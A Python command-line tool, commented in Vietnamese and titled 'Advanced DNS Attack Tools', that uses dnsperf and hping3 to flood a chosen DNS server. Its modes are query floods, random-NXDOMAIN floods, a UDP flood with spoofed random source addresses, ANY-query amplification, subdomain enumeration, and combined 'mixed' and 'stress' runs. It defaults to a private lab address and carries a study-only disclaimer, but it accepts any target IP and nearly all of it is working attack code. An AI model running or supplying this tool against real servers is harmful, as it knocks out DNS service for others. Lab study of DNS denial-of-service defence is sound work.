#!/usr/bin/env python3
"""
Advanced DNS Attack Tools
Sử dụng dnsperf, hping3, và các công cụ khác để tấn công DNS
CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP VÀ NGHIÊN CỨU
"""

import subprocess
import threading
import time
import random
import argparse
import os
import signal
import sys
from pathlib import Path

class AdvancedDNSAttacker:
    def __init__(self, target_ip="192.168.85.130", target_port=53):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.processes = []
        
        # Tạo thư mục temp cho query files
        self.temp_dir = Path("/tmp/dns_attacks")
        self.temp_dir.mkdir(exist_ok=True)
        
        # Domain lists cho testing
        self.legitimate_domains = [
            'test.local',
            'www.test.local',
            'mail.test.local',
            'ftp.test.local',
            'api.test.local',
            'blog.test.local',
            'shop.test.local'
        ]
        
        self.nxdomain_list = []
        for i in range(1000):
            length = random.randint(5, 15)
            domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=length))
            self.nxdomain_list.append(f"{domain}.test.local")
    
    def create_query_file(self, domains, filename, query_types=['A']):
        """Tạo file query cho dnsperf"""
        filepath = self.temp_dir / filename
        
        with open(filepath, 'w') as f:
            for domain in domains:
                for qtype in query_types:
                    f.write(f"{domain} {qtype}\n")
        
        return str(filepath)
    
    def dnsperf_flood_attack(self, duration=60, qps=1000):
        """Tấn công DNS Flood bằng dnsperf"""
        print(f"🚀 Starting dnsperf flood attack - QPS: {qps}, Duration: {duration}s")
        
        # Tạo query file với domains hợp lệ
        query_file = self.create_query_file(
            self.legitimate_domains * 100,  # Nhân lên để có nhiều queries
            "flood_queries.txt",
            ['A', 'AAAA', 'MX', 'TXT', 'NS']
        )
        
        cmd = [
            'dnsperf',
            '-s', self.target_ip,
            '-p', str(self.target_port),
            '-d', query_file,
            '-l', str(duration),
            '-c', '20',  # 20 concurrent connections
            '-Q', str(qps),  # Queries per second
            '-r', '0',  # Unlimited runs through file
            '-v'  # Verbose output
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            stdout, stderr = process.communicate()
            print("✅ dnsperf flood attack completed")
            print(f"📊 Results:\n{stdout.decode()}")
            
        except Exception as e:
            print(f"❌ Error in dnsperf attack: {e}")
    
    def dnsperf_nxdomain_attack(self, duration=60, qps=500):
        """Tấn công NXDOMAIN bằng dnsperf"""
        print(f"🚀 Starting dnsperf NXDOMAIN attack - QPS: {qps}, Duration: {duration}s")
        
        # Tạo query file với domains không tồn tại
        query_file = self.create_query_file(
            self.nxdomain_list,
            "nxdomain_queries.txt",
            ['A', 'AAAA']
        )
        
        cmd = [
            'dnsperf',
            '-s', self.target_ip,
            '-p', str(self.target_port),
            '-d', query_file,
            '-l', str(duration),
            '-c', '15',
            '-Q', str(qps),
            '-r', '0',
            '-v'
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            stdout, stderr = process.communicate()
            print("✅ dnsperf NXDOMAIN attack completed")
            print(f"📊 Results:\n{stdout.decode()}")
            
        except Exception as e:
            print(f"❌ Error in NXDOMAIN attack: {e}")
    
    def hping3_udp_flood(self, duration=60, pps=1000):
        """Tấn công UDP flood bằng hping3"""
        print(f"🚀 Starting hping3 UDP flood - PPS: {pps}, Duration: {duration}s")
        
        cmd = [
            'hping3',
            '-2',  # UDP mode
            '-p', str(self.target_port),  # Target port 53
            '-i', f'u{int(1000000/pps)}',  # Interval in microseconds
            '-c', str(pps * duration),  # Total packets
            '--rand-source',  # Random source IP
            '--data', '64',  # Packet size
            self.target_ip
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            # Chạy trong background và hiển thị progress
            start_time = time.time()
            while process.poll() is None and (time.time() - start_time) < duration:
                elapsed = int(time.time() - start_time)
                print(f"⏱️  hping3 UDP flood running... {elapsed}/{duration}s", end='\r')
                time.sleep(1)
            
            if process.poll() is None:
                process.terminate()
            
            print("\n✅ hping3 UDP flood completed")
            
        except Exception as e:
            print(f"❌ Error in hping3 attack: {e}")
    
    def amplification_attack(self, duration=60):
        """Tấn công DNS Amplification"""
        print(f"🚀 Starting DNS Amplification attack - Duration: {duration}s")
        
        # Tạo query file với ANY queries cho amplification
        amplification_domains = [
            'test.local',
            'www.test.local',
            'mail.test.local'
        ]
        
        query_file = self.create_query_file(
            amplification_domains * 50,
            "amplification_queries.txt",
            ['ANY', 'TXT']  # ANY queries for maximum response size
        )
        
        cmd = [
            'dnsperf',
            '-s', self.target_ip,
            '-p', str(self.target_port),
            '-d', query_file,
            '-l', str(duration),
            '-c', '10',
            '-Q', '200',
            '-r', '0',
            '-v'
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            stdout, stderr = process.communicate()
            print("✅ DNS Amplification attack completed")
            print(f"📊 Results:\n{stdout.decode()}")
            
        except Exception as e:
            print(f"❌ Error in amplification attack: {e}")
    
    def subdomain_enumeration_attack(self, duration=60):
        """Tấn công Subdomain Enumeration"""
        print(f"🚀 Starting Subdomain Enumeration attack - Duration: {duration}s")
        
        # Tạo danh sách subdomain phổ biến
        subdomains = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api',
            'blog', 'shop', 'forum', 'support', 'help', 'docs', 'wiki',
            'app', 'mobile', 'secure', 'vpn', 'proxy', 'cdn', 'static',
            'media', 'images', 'assets', 'files', 'download', 'upload'
        ]
        
        enum_domains = [f"{sub}.test.local" for sub in subdomains * 20]
        
        query_file = self.create_query_file(
            enum_domains,
            "enum_queries.txt",
            ['A', 'AAAA', 'CNAME']
        )
        
        cmd = [
            'dnsperf',
            '-s', self.target_ip,
            '-p', str(self.target_port),
            '-d', query_file,
            '-l', str(duration),
            '-c', '8',
            '-Q', '100',
            '-r', '0',
            '-v'
        ]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.processes.append(process)
            
            stdout, stderr = process.communicate()
            print("✅ Subdomain enumeration attack completed")
            print(f"📊 Results:\n{stdout.decode()}")
            
        except Exception as e:
            print(f"❌ Error in enumeration attack: {e}")
    
    def mixed_attack_scenario(self, duration=180):
        """Kịch bản tấn công hỗn hợp"""
        print(f"🚀 Starting Mixed Attack Scenario - Total Duration: {duration}s")
        
        # Chia thời gian thành các phases
        phase_duration = duration // 4
        
        threads = []
        
        # Phase 1: DNS Flood
        print(f"📍 Phase 1: DNS Flood ({phase_duration}s)")
        t1 = threading.Thread(target=self.dnsperf_flood_attack, args=(phase_duration, 800))
        threads.append(t1)
        t1.start()
        
        time.sleep(phase_duration + 5)  # Chờ phase 1 kết thúc
        
        # Phase 2: NXDOMAIN + UDP Flood
        print(f"📍 Phase 2: NXDOMAIN + UDP Flood ({phase_duration}s)")
        t2 = threading.Thread(target=self.dnsperf_nxdomain_attack, args=(phase_duration, 400))
        t3 = threading.Thread(target=self.hping3_udp_flood, args=(phase_duration, 500))
        threads.extend([t2, t3])
        t2.start()
        t3.start()
        
        time.sleep(phase_duration + 5)
        
        # Phase 3: Amplification
        print(f"📍 Phase 3: Amplification Attack ({phase_duration}s)")
        t4 = threading.Thread(target=self.amplification_attack, args=(phase_duration,))
        threads.append(t4)
        t4.start()
        
        time.sleep(phase_duration + 5)
        
        # Phase 4: Subdomain Enumeration
        print(f"📍 Phase 4: Subdomain Enumeration ({phase_duration}s)")
        t5 = threading.Thread(target=self.subdomain_enumeration_attack, args=(phase_duration,))
        threads.append(t5)
        t5.start()
        
        # Chờ tất cả threads kết thúc
        for t in threads:
            t.join()
        
        print("✅ Mixed attack scenario completed")
    
    def stress_test_attack(self, duration=120):
        """Stress test với tất cả công cụ đồng thời"""
        print(f"🚀 Starting Stress Test Attack - Duration: {duration}s")
        print("⚠️  WARNING: This will generate very high load!")
        
        confirm = input("Continue with stress test? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Stress test cancelled.")
            return
        
        threads = []
        
        # Chạy đồng thời nhiều loại tấn công
        attacks = [
            (self.dnsperf_flood_attack, (duration, 1500)),
            (self.dnsperf_nxdomain_attack, (duration, 800)),
            (self.hping3_udp_flood, (duration, 1000)),
            (self.amplification_attack, (duration,)),
            (self.subdomain_enumeration_attack, (duration,))
        ]
        
        for attack_func, args in attacks:
            t = threading.Thread(target=attack_func, args=args)
            threads.append(t)
            t.start()
            time.sleep(2)  # Stagger attacks
        
        # Chờ tất cả attacks kết thúc
        for t in threads:
            t.join()
        
        print("✅ Stress test completed")
    
    def cleanup(self):
        """Dọn dẹp processes và temp files"""
        print("🧹 Cleaning up...")
        
        # Terminate tất cả processes
        for process in self.processes:
            if process.poll() is None:
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        
        # Xóa temp files
        for file in self.temp_dir.glob("*.txt"):
            file.unlink()
        
        print("✅ Cleanup completed")
    
    def signal_handler(self, signum, frame):
        """Handle Ctrl+C"""
        print("\n🛑 Attack interrupted by user")
        self.cleanup()
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description='Advanced DNS Attack Tools')
    parser.add_argument('--target', default='192.168.85.130', help='Target DNS server IP')
    parser.add_argument('--port', type=int, default=53, help='Target port')
    parser.add_argument('--attack', choices=[
        'flood', 'nxdomain', 'udp-flood', 'amplification', 
        'enumeration', 'mixed', 'stress'
    ], required=True, help='Attack type')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('--qps', type=int, default=1000, help='Queries per second (for DNS attacks)')
    parser.add_argument('--pps', type=int, default=1000, help='Packets per second (for UDP flood)')
    
    args = parser.parse_args()
    
    # Kiểm tra tools có sẵn không
    required_tools = ['dnsperf', 'hping3']
    missing_tools = []
    
    for tool in required_tools:
        if subprocess.run(['which', tool], capture_output=True).returncode != 0:
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"❌ Missing required tools: {', '.join(missing_tools)}")
        print("Install with: sudo apt install dnsperf hping3")
        return
    
    print("="*60)
    print("🎯 Advanced DNS Attack Tools")
    print("⚠️  CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP VÀ NGHIÊN CỨU")
    print("="*60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack: {args.attack}")
    print(f"Duration: {args.duration} seconds")
    print("="*60)
    
    attacker = AdvancedDNSAttacker(args.target, args.port)
    
    # Setup signal handler
    signal.signal(signal.SIGINT, attacker.signal_handler)
    
    try:
        if args.attack == 'flood':
            attacker.dnsperf_flood_attack(args.duration, args.qps)
        elif args.attack == 'nxdomain':
            attacker.dnsperf_nxdomain_attack(args.duration, args.qps)
        elif args.attack == 'udp-flood':
            attacker.hping3_udp_flood(args.duration, args.pps)
        elif args.attack == 'amplification':
            attacker.amplification_attack(args.duration)
        elif args.attack == 'enumeration':
            attacker.subdomain_enumeration_attack(args.duration)
        elif args.attack == 'mixed':
            attacker.mixed_attack_scenario(args.duration)
        elif args.attack == 'stress':
            attacker.stress_test_attack(args.duration)
    
    finally:
        attacker.cleanup()

if __name__ == '__main__':
    main()